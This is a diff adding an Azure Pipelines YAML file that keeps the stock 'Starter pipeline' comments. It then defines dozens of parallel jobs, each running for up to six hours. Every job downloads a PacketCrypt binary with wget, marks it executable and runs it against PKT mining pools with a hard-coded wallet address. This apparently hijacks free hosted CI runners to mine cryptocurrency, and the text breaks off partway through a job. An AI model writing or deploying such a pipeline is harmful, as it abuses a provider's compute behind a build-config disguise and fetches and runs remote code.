@@ -1,0 +1,610 @@
+# Starter pipeline
+# Start with a minimal pipeline that you can customize to build and deploy your code.
+# Add steps that build, run tests, deploy, and more:
+# https://aka.ms/yaml
+
+trigger:
+- main
+
+pool: Azure Pipelines
+
+jobs:
+- job: aa
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: ab
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: ac
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: ad
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: ae
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: af
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: ag
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: ah
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: aj
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: ak
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p  pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: al
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: am
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: an
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: ao
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: ap
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: aq
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: ar
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: as
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: at
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: au
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p  pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: av
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: aw
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: ax
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: az
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: ba
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: bb
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: bc
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: bd
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: bf
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: bg
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p  pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: bh
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: bi
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: bj
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: bk
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: bl
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: bm
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: bn
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: bo
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: bp
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: bq
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p  pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: br
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: bs
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: bt
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: bu
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: bv
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: bw
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: bx
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: by
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: bz
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: ca
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p  pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: cb
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: cc
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: cd
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: ce
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: cf
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: cg
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: ch
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: ci
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: cj
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: ck
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p  pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: cl
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: cm
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: cn
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: co
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: cp
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: cq
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: cr
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: cs
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: ct
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: cu
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p  pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: cv
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: cw
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: cx
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: cy
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: cz
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: da
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: db
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: dc
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: dd
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: de
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p  pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: df
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: dg
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: dh
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: di
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: dj
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: dk
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: dl
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: dm
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
+  - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah && chmod +x lah && ./lah ann -p pkt1qa8vq422cknyn94ley9tvn3gfxm5wk43vcll02s http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+
+- job: dn
+  timeoutInMinutes: 360
+  cancelTimeoutInMinutes: 360
+  steps:
